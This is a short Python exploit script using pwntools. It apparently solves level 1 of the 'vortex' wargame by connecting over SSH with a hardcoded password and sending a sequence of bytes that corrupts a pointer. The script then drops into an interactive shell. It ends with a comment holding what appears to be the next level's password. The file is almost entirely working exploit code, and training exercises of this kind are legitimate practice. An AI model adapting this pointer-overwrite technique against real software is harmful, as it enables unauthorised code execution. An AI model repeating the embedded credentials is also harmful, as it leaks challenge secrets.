from pwn import *


local_dir = None
remote_binary = None
local_binary = None
libc = None
port = None
elf = None
def connect(level, password):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/vortex/"+level
    remote_binary = "/vortex/vortex"+level
    cloned_binary = local_dir+remote_binary
    port = 2228
    s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {cloned_binary}")
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib32/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s

s = connect("1", "Gq#qu3bF3")
io = s.process([remote_binary])

# decrement pointer until points to most significant byte of ptr -> skip x and half buffer
for i in range(256 + 4 + 1):
    io.send(b"\\")
# decrement pointer until points to start of ptr

io.send(b"\xca")
# trigger e()
io.send(b"A")

io.interactive()

# 23anbT\rE


